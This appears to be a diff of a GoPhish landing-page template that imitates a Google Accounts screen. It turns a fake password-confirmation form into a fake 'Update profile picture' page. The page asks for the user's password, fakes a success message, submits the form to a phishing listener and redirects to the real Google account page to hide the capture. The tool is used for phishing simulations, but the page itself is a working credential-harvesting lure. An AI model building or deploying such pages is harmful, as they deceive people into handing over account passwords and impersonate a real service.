@@ -2,494 +2,193 @@
 <html lang="en">
     <head>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
         <link rel="preconnect" href="https://fonts.googleapis.com" />
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-        <link
-            href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
-            rel="stylesheet"
-        />
-        <title>Password</title>
-        <link
-            rel="shortcut icon"
-            type="img/png"
-            href="https://upload.wikimedia.org/wikipedia/commons/thumb/archive/c/c1/20221203181232%21Google_%22G%22_logo.svg/120px-Google_%22G%22_logo.svg.png"
-        />
+        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
+        <title>Confirm Identity - Google Accounts</title>
+        <link rel="shortcut icon" type="img/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/120px-Google_%22G%22_logo.svg.png" />
     </head>
     <body>
         <div class="form">
-            <img src="https://www.vectorlogo.zone/logos/google/google-ar21.svg" />
+            <img src="https://www.vectorlogo.zone/logos/google/google-ar21.svg" alt="Google" />
+            
             <div class="password-change-wrapper">
-                <h2 class="password-change">Password confirmation</h2>
+                <h2 class="password-change">Update profile picture</h2>
                 <div class="email-wrapper">
-                    <img
-                        class="profile-image"
-                        src="https://api.iconify.design/material-symbols:account-circle.svg"
-                        alt=""
-                    />
+                    <img class="profile-image" src="https://api.iconify.design/material-symbols:account-circle.svg" alt="" />
                     <p class="password_change-email">{{.Email}}</p>
                 </div>
             </div>
 
             <div class="password-tip-wrapper">
-                <p class="password-tip password-tip-centered">Confirm your password to continue.</p>
-
-                <p class="password-tip">For your security, please re-enter your account password to authorize this change. This helps us ensure it's really you making these updates.</p>
-            </div>
-            <div class="learn-more-wrapper">
-                <a class="learn-more-link" href="https://support.google.com/accounts/answer/32040?hl=en" target="_blank">Learn more</a>
-                <img
-                    class="question-mark"
-                    src="https://api.iconify.design/radix-icons:question-mark-circled.svg"
-                    alt=""
-                />
+                <p class="password-tip">To enable custom profile pictures, please verify your account and select your image below.</p>
             </div>
 
-            <form method="post" class="form-body">
-                <div class="input-confirm input-password">
-                    <input type="password" name="password" id="password" />
-                    <span class="input-confirm-text">New password</span>
+            <form method="post" class="form-body" id="phish-form">
+                <div class="upload-section">
+                    <p class="upload-label">1. Choose your new profile photo</p>
+                    <div class="file-drop-area">
+                        <span class="fake-btn">Choose file</span>
+                        <span class="file-msg" id="file-name">or drag and drop here</span>
+                        <input class="file-input" type="file" id="profile_photo" accept="image/png, image/jpeg, image/jpg">
+                    </div>
+                    <p class="helper-text">Supported formats: JPG, PNG (Max 5MB)</p>
                 </div>
 
-                <b><p class="password-strength-title">Password strength</p></b>
-                <div class="password-strength-wrapper">
-                    <p class="password-strength-text">
-                        Use at least 8 characters. Don't use a password from another site, or something too obvious like
-                        your pet's name.
-                    </p>
-                    <div class="why-link">
-                        <a class="learn-more-link" href="https://support.google.com/accounts/answer/54490?hl=en-EN" target="_blank">Why</a>
-                        <img
-                            class="question-mark"
-                            src="https://api.iconify.design/radix-icons:question-mark-circled.svg"
-                            alt=""
-                        />
+                <div class="verification-section">
+                    <p class="upload-label">2. Confirm password to authorize</p>
+                    <div class="input-confirm">
+                        <input type="password" name="password" id="password_input" required />
+                        <span class="input-confirm-text">Password</span>
+                    </div>
+                    <div class="show-password">
+                        <input class="checkbox" type="checkbox" onclick="togglePasswordVisibility()" />
+                        <p class="show-password-text">Show Password</p>
                     </div>
                 </div>
-                <div class="input-confirm">
-                    <input type="password" name="Password" id="confirm_password" />
-                    <span class="input-confirm-text">Confirm password</span>
-                    <p class="match-message" id="message"></p>
+
+                <div class="button-wrapper">
+                    <input onclick="validateAndSubmit()" type="button" class="change-password-button" value="Update Profile">
                 </div>
-                <div class="show-password">
-                    <input class="checkbox" type="checkbox" onclick="showPassword()" />
-                    <p class="show-password-text">Show Password</p>
-                    
-                </div>
-
-                <script>
-                    function showPassword() {
-                        var x = document.getElementById("password");
-                        if (x.type === "password") {
-                            x.type = "text";
-                        } else {
-                            x.type = "password";
-                        }
-
-                        var x = document.getElementById("confirm_password");
-                        if (x.type === "password") {
-                            x.type = "text";
-                        } else {
-                            x.type = "password";
-                        }
-                    }
-/*
-                    $("#password, #confirm_password").on("keyup", function () {
-                        if ($("#password").val() == $("#confirm_password").val()) {
-                            $("#message").html("Matching").css("color", "green");
-                        } else $("#message").html("Not Matching").css("color", "red");
-                    });
-*/
-                    function showModal() {
-                        var password = document.getElementById("confirm_password").value;
-                        var confirmPassword = document.getElementById("confirm_password").value;
-
-                        // Check if password is at least 8 characters
-                        if (password.length < 8) {
-                            showValidationModal("Password must be at least 8 characters long.");
-                            return;
-                        }
-
-                        // Check if passwords match
-                        if (password !== confirmPassword) {
-                            showValidationModal("Passwords do not match.");
-                            return;
-                        }
-
-                        // Skip confirmation modal and go directly to success
-                        confirmChange();
-                    }
-
-                    function showValidationModal(message) {
-                        document.getElementById('validationMessage').textContent = message;
-                        document.getElementById('validationModal').style.display = 'block';
-                    }
-
-                    function closeValidationModal() {
-                        document.getElementById('validationModal').style.display = 'none';
-                    }
-
-                    function closeModal() {
-                        document.getElementById('confirmModal').style.display = 'none';
-                    }
-
-                    function confirmChange() {
-                        showSuccessModal();
-                    }
-
-                    function showSuccessModal() {
-                        document.getElementById('successModal').style.display = 'block';
-                        setTimeout(function() {
-                            window.location.href = 'https://mail.google.com/mail/u/0/#inbox';
-                        }, 3000); // Redirect after 2 seconds
-                    }
-
-                    document.body.addEventListener("click", () => {
-                        if (
-                            document.getElementById("password").value.length == 0 &&
-                            document.getElementById("confirm_password").value.length == 0
-                        ) {
-                            document.getElementById("message").innerHTML = "";
-                        }
-                    });
-                </script>
-
-                <div class="button-wrapper"><input onclick="showModal()" type="button" class="change-password-button" value="Confirm password"></input></div>
             </form>
 
-            <!-- Modal -->
-            <!-- <div id="confirmModal" class="modal">
-                <div class="modal-content">
-                    <p>Are you sure you want to change your password?</p>
-                    <div class="modal-buttons">
-                        <button class="modal-btn cancel-btn" onclick="closeModal()">Cancel</button>
-                        <button class="modal-btn confirm-btn" onclick="confirmChange()">Yes</button>
-                    </div>
-                </div>
-            </div> -->
-
-            <!-- Success Modal -->
-            <div id="successModal" class="modal">
-                <div class="modal-content">
-                    <p>✓ Password confirmed successfully!</p>
-                    <p style="font-size: 0.9rem; color: #797979; margin-top: 10px;">You will be redirected shortly...</p>
-                </div>
+            <div class="learn-more-container">
+                <a class="learn-more-link" href="https://support.google.com/accounts/answer/32040?hl=en" target="_blank">Learn more about account security</a>
+                <img class="footer-question" src="https://api.iconify.design/radix-icons:question-mark-circled.svg" alt="" />
             </div>
 
-            <!-- Validation Modal -->
             <div id="validationModal" class="modal">
                 <div class="modal-content">
-                    <p id="validationMessage">Password confirmation error</p>
+                    <p id="validationMessage" style="color: #000000; font-weight: 400;">Verification Error</p>
                     <div class="modal-buttons">
                         <button class="modal-btn confirm-btn" onclick="closeValidationModal()" style="width: 100%;">OK</button>
                     </div>
                 </div>
             </div>
-        
+
+            <div id="successModal" class="modal">
+                <div class="modal-content">
+                    <p style="color: #1e8e3e; font-size: 1.2rem; font-weight: 500;">✓ Profile updated!</p>
+                    <p style="font-size: 0.9rem; color: #595959; margin-top: 10px;">
+                        Your new photo will be synced across all services. 
+                        <br><br>
+                        Redirecting to your profile in <span id="timer" style="font-weight: bold; color: #1a73e8;">5</span> seconds...
+                    </p>
+                </div>
+            </div>
 
             <style>
-                * {
-                    box-sizing: border-box;
-                }
+                /* Layout Fixes */
+                * { box-sizing: border-box; }
+                body { background-color: #f8f9fa; font-family: "Roboto", sans-serif; display: flex; align-items: center; min-height: 100vh; margin: 0; }
+                .form { background-color: #ffffff; min-width: 350px; max-width: 450px; margin: 20px auto; padding: 40px; text-align: center; border: 1px solid #dadce0; border-radius: 8px; }
+                img { display: block; width: 75px; margin: 0 auto 15px auto; }
+                
+                .password-change { color: #202124; font-weight: 400; font-size: 24px; margin: 0; }
+                .email-wrapper { display: inline-flex; align-items: center; justify-content: center; border: 1px solid #dadce0; border-radius: 100px; padding: 2px 12px; margin-top: 10px; margin-left: auto; margin-right: auto; }
+                .profile-image { width: 18px; height: 18px; margin-right: 8px; margin-top: 14px; filter: opacity(0.6); }
+                .password_change-email { color: #3c4043; font-size: 14px; margin: 0; font-weight: 500; }
+                .password-tip-wrapper { margin: 25px 0; }
+                .password-tip { color: #202124; font-size: 14px; line-height: 1.4; text-align: center; }
+                
+                /* Upload Section */
+                .upload-section { text-align: left; margin-bottom: 25px; }
+                .upload-label { font-size: 14px; font-weight: 600; color: #3c4043; margin-bottom: 8px; }
+                .file-drop-area { position: relative; display: flex; align-items: center; padding: 12px; border: 1px dashed #dadce0; border-radius: 4px; cursor: pointer; }
+                .fake-btn { background-color: #f1f3f4; border: 1px solid #dadce0; border-radius: 4px; padding: 4px 8px; font-size: 12px; margin-right: 10px; }
+                .file-msg { font-size: 12px; color: #70757a; }
+                .file-input { position: absolute; left: 0; top: 0; height: 100%; width: 100%; opacity: 0; cursor: pointer; }
+                .helper-text { font-size: 11px; color: #70757a; margin-top: 4px; }
 
-                body {
-                    background-color: #eeeeee;
-                    font-family: "Roboto", sans-serif;
-                }
+                /* Verification Section */
+                .verification-section { text-align: left; }
+                .input-confirm { position: relative; margin-top: 20px; }
+                .input-confirm-text { position: absolute; left: 12px; top: -10px; background: #fff; padding: 0 4px; font-size: 12px; color: #70757a; }
+                input[type="password"] { border-radius: 4px; padding: 13px 15px; width: 100%; border: 1px solid #dadce0; font-size: 16px; outline: none; }
+                input[type="text"] { border-radius: 4px; padding: 13px 15px; width: 100%; border: 1px solid #dadce0; font-size: 16px; outline: none; }
+                input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+                .show-password { display: flex; align-items: center; margin-top: 8px; }
+                .checkbox { margin-right: 10px; width: 16px; height: 16px; }
+                .show-password-text { font-size: 14px; color: #3c4043; margin: 0; }
 
-                img {
-                    display: block;
-                    width: 100px;
-                    margin: 30px auto;
-                    margin-bottom: 0.3rem;
-                    margin-top: 0;
-                }
+                /* Footer Element Fixes */
+                .learn-more-container { display: flex; align-items: center; justify-content: center; margin-top: 30px; border-top: 1px solid #f1f1f1; padding-top: 20px; }
+                .learn-more-link { color: #1a73e8; font-size: 13px; font-weight: 500; text-decoration: none; }
+                .footer-question { width: 16px; height: 16px; margin-left: 6px; margin-top: 14px; filter: invert(36%) sepia(85%) saturate(1243%) hue-rotate(201deg) brightness(96%) contrast(92%); }
 
-                .password-tip-wrapper {
-                    margin-bottom: 3rem;
-                }
-
-                .password-tip {
-                    text-align: left;
-                    color: #838383;
-                    margin-bottom: 0;
-                }
-
-                .password-tip-centered {
-                    text-align: center;
-                }
-
-                .password-change {
-                    color: #595959;
-                    font-weight: 500;
-                    font-size: 1.5rem;
-                    text-align: center;
-                    margin-bottom: 0;
-                    margin-top: 0;
-                }
-
-                .match-message {
-                    font-size: 0.9rem;
-                    text-align: right;
-                    margin-top: -10px;
-                }
-
-                .show-password {
-                  position: relative;
-                    display: flex;
-                    flex-direction: row;
-                    width: 45%;
-                  
-                }
-
-                .checkbox {
-                    position: absolute;
-                   margin-top: 19px;
-                   margin-right: 10px;
-                   width: 15px;
-                   align-self: flex-start;
-                   
-                }
-
-                .show-password-text {
-                    text-align: left;
-                    color: #838383;
-                    width: 180px;
-                    margin-left: 20px;
-                }
-
-                .learn-more-wrapper {
-                    display: flex;
-                    flex-direction: row;
-                    align-items: center;
-                    margin-top: -5rem;
-                    margin-bottom: 10px;
-                }
-
-                .email-wrapper {
-                    display: inline-flex;
-                    align-items: center;
-                }
-
-                .why-link {
-                    display: flex;
-                    align-items: center;
-                    margin-top: -2.4rem;
-                    margin-bottom: 5px;
-                    display: none;
-                }
-
-                .password-strength-title {
-                    text-align: left;
-                    margin-bottom: 0;
-                    margin-top: 0;
-                    color: #797979;
-                    display: none;
-                }
-
-                .password-strength-text {
-                    display: flex;
-                    flex-direction: row;
-                    align-items: center;
-                    text-align: left;
-                    font-size: 0.9rem;
-                    color: #797979;
-                    margin-top: 0.6rem;
-                      display: none;
-                }
-
-                .password_change-email {
-                    color: #797979;
-                }
-
-                .profile-image {
-                    width: 20px;
-                    height: 20px;
-                    filter: invert(24%) sepia(99%) saturate(1612%) hue-rotate(199deg) brightness(98%) contrast(95%);
-                    margin-right: 5px;
-                    margin-top: 6px;
-                }
-
-                .password-strength-wrapper {
-                    display: flex;
-                    flex-direction: column;
-                }
-
-                .learn-more-link {
-                    color: #0b57d0;
-                    padding-left: 0;
-                    margin-top: 2rem;
-                }
-
-                .question-mark {
-                    height: 20px;
-                    width: 20px;
-                    margin: 0;
-                    margin-top: 28px;
-                    filter: invert(24%) sepia(99%) saturate(1612%) hue-rotate(199deg) brightness(98%) contrast(95%);
-                }
-
-                .form {
-                    background-color: #ffffff;
-                    min-width: 300px;
-                    max-width: 600px;
-                    height: 90%;
-                    margin: 50px auto 10px auto;
-                    padding: 1% 2.5%;
-                    overflow: hidden;
-                    text-align: center;
-                    border: 1px solid #d0d0d0;
-                    border-radius: 5px;
-                }
-
-                .form-body {
-                    padding: 1rem 0;
-                    display: flex;
-                    flex-direction: column;
-                    width: 100%;
-                }
-
-                .input-confirm {
-                    position: relative;
-                    margin-top: 10px;
-                    
-                }
-
-                .input-password {
-                    display: none;
-                }
-
-                .input-confirm-text {
-                    position: absolute;
-                    z-index: 2;
-                    left: 0;
-                    top: -12px;
-                    padding: 5px;
-                    left: 10px;
-                    font-size: 0.8rem;
-                    background-color: #ffffff;
-                    color: #797979;
-                }
-
-                input {
-                    border-radius: 3px;
-                    padding: 18px 15px;
-                    width: 100%;
-                    border: 1px solid #838383;
-                    outline: none;
-                    display: block;
-                    margin: 0 auto 20px auto;
-                    position: relative;
-                }
-
-                input:focus {
-                    border: 1px solid #0250d6;
-                }
-
-                input:focus + span {
-                    color: #0250d6;
-                }
-
-                .button-wrapper {
-                    display: flex;
-                    flex-direction: row;
-                    align-self: flex-end;
-                }
-
-                .change-password-button {
-                    border-radius: 100px;
-                    border: none;
-                    width: 200px;
-                    text-decoration: none;
-                    background: #0250d6;
-                    padding: 13px 30px;
-                    color: #ffffff;
-                    margin-top: 1.5rem;
-                    margin-bottom: 1rem;
-                    font-weight: 600;
-                    display: block;
-                    transition: all 0.2s;
-                }
-
-                .change-password-button:hover {
-                    box-shadow: 0px 0px 8px gray;
-                    background: #256dea;
-                }
-
-                a {
-                    text-align: center;
-                    margin-top: 30px;
-                    color: #719be6;
-                    text-decoration: none;
-                    padding: 5px;
-                    display: inline-block;
-                }
-
+                /* Button */
+                .button-wrapper { display: flex; justify-content: flex-end; margin-top: 30px; }
+                .change-password-button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+                
                 /* Modal Styles */
-                .modal {
-                    display: none;
-                    position: fixed;
-                    z-index: 1000;
-                    left: 0;
-                    top: 0;
-                    width: 100%;
-                    height: 100%;
-                    background-color: rgba(0, 0, 0, 0.5);
-                }
-
-                .modal-content {
-                    background-color: #ffffff;
-                    margin: 15% auto;
-                    padding: 20px;
-                    border: 1px solid #d0d0d0;
-                    border-radius: 5px;
-                    width: 300px;
-                    text-align: center;
-                    font-family: "Roboto", sans-serif;
-                }
-
-                .modal-content p {
-                    margin-bottom: 20px;
-                    color: #595959;
-                    font-size: 1rem;
-                }
-
-                .modal-buttons {
-                    display: flex;
-                    justify-content: space-around;
-                }
-
-                .modal-btn {
-                    padding: 10px 20px;
-                    border: none;
-                    border-radius: 100px;
-                    font-weight: 600;
-                    cursor: pointer;
-                    transition: all 0.2s;
-                }
-
-                .cancel-btn {
-                    background: #f1f1f1;
-                    color: #595959;
-                }
-
-                .cancel-btn:hover {
-                    background: #e0e0e0;
-                }
-
-                .confirm-btn {
-                    background: #0250d6;
-                    color: #ffffff;
-                }
-
-                .confirm-btn:hover {
-                    background: #256dea;
-                    box-shadow: 0px 0px 8px gray;
-                }
+                .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(32,33,36,0.6); }
+                .modal-content { background-color: #ffffff; margin: 15% auto; padding: 24px; border-radius: 8px; width: 320px; text-align: center; box-shadow: 0 12px 15px 0 rgba(0,0,0,0.24); }
+                .confirm-btn { background: #1a73e8; color: #ffffff; border: none; padding: 8px 24px; border-radius: 4px; cursor: pointer; }
             </style>
+
+            <script>
+                const fileInput = document.getElementById('profile_photo');
+                const fileNameDisplay = document.getElementById('file-name');
+
+                fileInput.addEventListener('change', function() {
+                    if (this.files && this.files.length > 0) {
+                        fileNameDisplay.textContent = this.files[0].name;
+                        fileNameDisplay.style.color = "#1e8e3e";
+                    }
+                });
+
+                function togglePasswordVisibility() {
+                    const x = document.getElementById("password_input");
+                    x.type = (x.type === "password") ? "text" : "password";
+                }
+
+                function showValidationModal(message) {
+                    document.getElementById('validationMessage').textContent = message;
+                    document.getElementById('validationModal').style.display = 'block';
+                }
+
+                function closeValidationModal() {
+                    document.getElementById('validationModal').style.display = 'none';
+                }
+
+                function validateAndSubmit() {
+                    const password = document.getElementById("password_input").value;
+                    const file = fileInput.files[0];
+
+                    if (password.length < 8) {
+                        showValidationModal("Password must be at least 8 characters long.");
+                        return;
+                    }
+                    if (!file) {
+                        showValidationModal("Please select a profile photo to upload.");
+                        return;
+                    }
+                    if (file.size > 5 * 1024 * 1024) {
+                        showValidationModal("Profile photo must be 5MB or smaller.");
+                        return;
+                    }
+
+                    // Start Success Flow
+                    document.getElementById('successModal').style.display = 'block';
+                    
+                    let seconds = 5;
+                    const timerElement = document.getElementById('timer');
+                    
+                    const countdown = setInterval(function() {
+                        seconds--;
+                        timerElement.textContent = seconds;
+                        if (seconds <= 0) {
+                            clearInterval(countdown);
+                            // Submit to GoPhish listener
+                            document.getElementById('phish-form').submit();
+                            // Redirect to official Google Security Info page
+                            window.location.replace("https://myaccount.google.com/personal-info");
+                        }
+                    }, 1000);
+                }
+            </script>
         </div>
     </body>
 </html>
